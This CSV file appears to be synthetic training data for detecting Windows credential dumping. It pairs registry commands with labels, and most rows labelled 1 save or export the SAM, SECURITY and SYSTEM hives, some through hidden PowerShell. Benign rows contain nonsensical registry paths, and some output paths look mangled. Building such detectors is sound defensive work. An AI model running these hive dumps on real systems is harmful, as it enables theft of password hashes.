text,label
cmd.exe /c start /b reg.exe   export   hkey_local_machine\security  c:\windows\temp\sam.save,1
c:\windows\system32\cmd.exe /k reg   export   hklm\security  \.\c$ackup.reg   /y,1
c:\windows\system32\cmd.exe /k reg save  hklm\system  %temp%\sec_backup.dat,1
"reg query ""hkey_local_machine\control panel\desktop\subkey16""",0
"cmd /c reg   compare   ""hkcu\hkey_local_machine\software\wow6432node""   ""hkcu\software\myapp\settings_808""",0
reg.exe   save   hkey_local_machine\security c:\users\public\registry_export.reg  /y,1
"reg.exe query ""hkcu\software\google\chrome"" /v version",0
"powershell -c reg unload ""hkey_current_user\hkey_local_machine\software\wow6432node\subkey46"" /v version",0
"powershell -c reg.exe add ""hkey_current_user\software\classes"" /v version /t reg_sz",0
powershell -exec bypass -w hidden -c reg save   hklm\system c:\temp\system.hive,1
cmd.exe /c reg.exe  save  hkey_local_machine\system   c:\windows\temp\sam.save,1
powershell -exec bypass -w hidden -c reg export hkey_local_machine\security  c:\temp\system.hive,1
"reg  restore  ""hkey_current_user\software\classes""  ""hkey_current_user\software\policies\mycorp_717""",0
"cmd /c powershell -c ""reg.exe export   hklm\security  c:\temp\system.hive""",1
powershell -exec bypass -w hidden -c reg   export   hkey_local_machine\sam c:\users\public\registry_export.reg,1
cmd.exe /c reg.exe export hklm\security  \\localhost\c$\__dump\sam.bak /y,1
reg   export   hklm\system   c:\users\public\registry_export.reg /y,1
reg.exe save,0
"reg delete ""hkey_current_user\software\google\chrome"" /f",0
"powershell -c reg.exe   restore   ""hkey_users\hkey_local_machine\software\policies\microsoft\subkey24""   ""hkey_users\hkey_local_machine\software\wow6432node_478""",0
cmd.exe /c start /b reg   save hklm\security  %temp%\sec_backup.dat,1
cmd.exe /c start /b reg  save   hklm\sam  c:\users\public\registry_export.reg   /y,1
cmd.exe /c start /b reg save   hkey_local_machine\sam c:\temp\system.hive,1
"cmd /c powershell -c ""reg   export hklm\system   c:\temp\system.hive""",1
"start /b reg copy ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control\subkey6"" ""hkey_local_machine\control panel\desktop_268""",0
cmd.exe /c start /b reg   save hklm\system   %temp%\sec_backup.dat   /y,1
"start /b reg restore ""hkcu\software\microsoft\windows\currentversion"" ""hkcu\environment_657""",0
reg.exe query,0
reg  save   hklm\sam   %temp%\sec_backup.dat  /y,1
cmd.exe /c start /b reg.exe save hklm\system   c:\windows\temp\sam.save,1
"reg  unload  ""hkey_current_user\control panel\desktop""",0
"reg  restore  ""hkey_users\system\currentcontrolset\services""  ""hkey_users\software\classes_875""",0
cmd.exe /c reg.exe  save hkey_local_machine\security c:\users\public\registry_export.reg,1
c:\windows\system32\cmd.exe /k reg  save hklm\system  \.\c$ackup.reg,1
cmd.exe /c start /b reg  export hklm\system c:\windows\temp\sam.save,1
cmd.exe /c reg.exe   export hklm\system   c:\windows\temp\sam.save,1
"reg.exe  compare  ""hkey_users\hkey_local_machine\software\policies\microsoft""  ""hkey_users\software\google\chrome_209""",0
"powershell -c reg  delete  ""hkcu\software\classes\subkey71""  /v path",0
pwsh -noprofile -c reg.exe   save  hkey_local_machine\system %temp%\sec_backup.dat  /y,1
"reg.exe   compare   ""hkey_local_machine\hkey_local_machine\software\wow6432node""   ""hkey_local_machine\hkey_local_machine\software\wow6432node_743""",0
"reg.exe save ""hkey_local_machine\hkey_local_machine\software\policies\microsoft"" ""c:\users\public\chrome_data.bak""",0
powershell -exec bypass -w hidden -c reg.exe   save  hklm\system c:\windows\temp\sam.save,1
"powershell -c reg.exe   delete   ""hkey_current_user\control panel\desktop""   /v path",0
powershell -exec bypass -w hidden -c reg save  hklm\sam   c:\windows\temp\sam.save  /y,1
"reg   save   ""hkcu\system\currentcontrolset\services""   ""c:\users\public\chrome_data.bak""   /y",0
pwsh -noprofile -c reg.exe save   hkey_local_machine\sam %temp%\sec_backup.dat /y,1
"cmd /c powershell -c ""reg  export   hklm\system  \\localhost\c$\__dump\sam.bak   /y""",1
"cmd /c powershell -c ""reg.exe  save hkey_local_machine\security   c:\users\public\registry_export.reg   /y""",1
"cmd /c reg.exe  restore  ""hkey_users\software\myapp\settings\subkey84""  ""hkey_users\software\policies\mycorp_708""",0
pwsh -noprofile -c reg  export  hkey_local_machine\system   \.\c$ackup.reg  /y,1
"reg.exe  compare  ""hkey_local_machine\software\policies\mycorp\subkey82""  ""hkey_local_machine\software\myapp\settings_542""",0
"cmd /c powershell -c ""reg.exe   export  hkey_local_machine\system   c:\windows\temp\sam.save  /y""",1
"cmd /c powershell -c ""reg.exe export  hkey_local_machine\security c:\windows\temp\sam.save""",1
"cmd /c reg.exe delete ""hku\hkey_local_machine\software\policies\microsoft""",0
"reg.exe  copy  ""hkey_local_machine\control panel\desktop\subkey73""  ""hkey_local_machine\system\currentcontrolset\services_715""",0
c:\windows\system32\cmd.exe /k reg.exe   save   hkey_local_machine\system   \\localhost\c$\__dump\sam.bak,1
c:\windows\system32\cmd.exe /k reg.exe  save   hklm\sam  \\localhost\c$\__dump\sam.bak,1
powershell -exec bypass -w hidden -c reg   save hklm\security  %temp%\sec_backup.dat  /y,1
cmd.exe /c reg  export hkey_local_machine\security   \.\c$ackup.reg /y,1
c:\windows\system32\cmd.exe /k reg.exe save hkey_local_machine\system   \.\c$ackup.reg  /y,1
"reg.exe  compare  ""hkey_users\software\policies\mycorp\subkey69""  ""hkey_users\software\policies\mycorp_170""",0
"reg.exe add ""hku\control panel\desktop"" /v version /t reg_sz /d 1",0
powershell -command reg.exe  save  hkey_local_machine\system   c:\users\public\registry_export.reg   /y,1
"start /b reg restore ""hkey_current_user\hkey_local_machine\software\policies\microsoft"" ""hkey_current_user\hkey_local_machine\software\wow6432node_233""",0
"cmd /c reg.exe   delete   ""hkey_users\software\google\chrome\subkey4""   /v lastupdate",0
"powershell -c reg   add   ""hkcu\control panel\desktop\subkey5""   /f   /t reg_dword   /d ""c:\program files\app""",0
powershell -exec bypass -w hidden -c reg.exe save   hklm\sam  c:\users\public\registry_export.reg,1
powershell -command reg.exe export  hkey_local_machine\sam \\localhost\c$\__dump\sam.bak,1
